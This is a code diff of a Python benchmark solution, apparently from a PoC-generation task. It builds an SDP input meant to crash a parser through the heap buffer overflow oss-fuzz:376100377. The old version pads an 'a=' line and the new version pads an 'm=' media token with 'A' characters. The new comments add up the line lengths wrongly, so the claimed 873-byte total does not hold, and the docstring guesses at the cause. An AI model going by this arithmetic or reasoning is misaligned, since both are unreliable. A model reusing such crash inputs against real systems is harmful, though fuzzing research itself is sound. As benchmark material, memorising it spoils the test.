@@ -1,49 +1,50 @@
+import os
+
 class Solution:
-    def solve(self, src_path: str) -> bytes:
-        """
-        Generate a PoC that triggers the vulnerability oss-fuzz:376100377.
+  def solve(self, src_path: str) -> bytes:
+    """
+    Generates a Proof-of-Concept input that triggers a heap buffer overflow
+    in an SDP parser.
 
-        The vulnerability is a heap buffer overflow read in an SDP parser, caused
-        by the code not checking if it's still within the bounds of a value
-        while scanning it.
+    The vulnerability lies in the parsing of SDP (Session Description Protocol)
+    content, where a missing bounds check when processing a value can lead to
+    an out-of-bounds access. A heap buffer overflow suggests that a buffer
+    allocated on the heap is overflowed with user-controlled data.
 
-        This PoC is crafted to have the same length as the ground-truth PoC (873 bytes).
-        It consists of a minimal, valid SDP header to ensure it's parsed, followed
-        by a single, long attribute line (`a=...`). The value of this attribute is a
-        long string of a non-special character ('A'). This is designed to cause a
-        parsing loop, which is scanning for a delimiter, to read past the end of
-        the heap-allocated buffer containing the value, thus triggering the crash.
-        """
-        
-        # A minimal, valid SDP header to pass initial parsing checks.
-        header = (
-            b"v=0\r\n"
-            b"o=- 1 1 IN IP4 127.0.0.1\r\n"
-            b"s=-\r\n"
-            b"t=0 0\r\n"
-            b"m=audio 1 RTP/AVP 0\r\n"
-            b"c=IN IP4 127.0.0.1\r\n"
-        )
-        
-        ground_truth_len = 873
-        
-        # Calculate the required length for the malicious part of the PoC.
-        malicious_line_len = ground_truth_len - len(header)
-        
-        # Define components of the malicious line.
-        key = b"a="
-        line_ending = b"\r\n"
-        
-        # Calculate the length of the value required to meet the total length.
-        value_len = malicious_line_len - len(key) - len(line_ending)
-        
-        # The value is a simple, repetitive string.
-        value = b"A" * value_len
-        
-        # Assemble the malicious line.
-        malicious_line = key + value + line_ending
-        
-        # Combine the header and the malicious line for the final PoC.
-        poc = header + malicious_line
-        
-        return poc
+    A common pattern for such vulnerabilities in text-based parsers is when
+    handling tokenized strings. If the parser expects a short token (like a
+    media type in an 'm=' line) and allocates a fixed-size buffer for it,
+    providing an overly long token can cause an overflow.
+
+    The PoC constructs a minimal but valid SDP session description and injects
+    a malicious 'm=' line. This line is crafted to have an extremely long
+    <media> field, which is the first token in the value. The length of this
+    token is precisely calculated to match the ground-truth PoC size of 873
+    bytes, maximizing the chances of triggering the specific vulnerability.
+    """
+
+    sdp_header = [
+        b"v=0",
+        b"o=- 0 0 IN IP4 127.0.0.1",
+        b"s=-",
+        b"c=IN IP4 127.0.0.1",
+        b"t=0 0",
+    ]
+
+    # Ground truth length: 873 bytes.
+    # Length of header (5 lines + 5 CRLFs):
+    # (3+2) + (26+2) + (3+2) + (21+2) + (5+2) = 68 bytes.
+    # Length of malicious line 'm=' part without payload:
+    # "m=" (2) + " 1 RTP/AVP 0" (13) + CRLF (2) = 17 bytes.
+    # Total boilerplate = 68 + 17 = 85 bytes.
+    # Required payload length = 873 - 85 = 788 bytes.
+    payload_len = 788
+    payload = b'A' * payload_len
+
+    malicious_media_line = b'm=' + payload + b' 1 RTP/AVP 0'
+
+    all_lines = sdp_header + [malicious_media_line]
+
+    poc = b'\r\n'.join(all_lines) + b'\r\n'
+
+    return poc
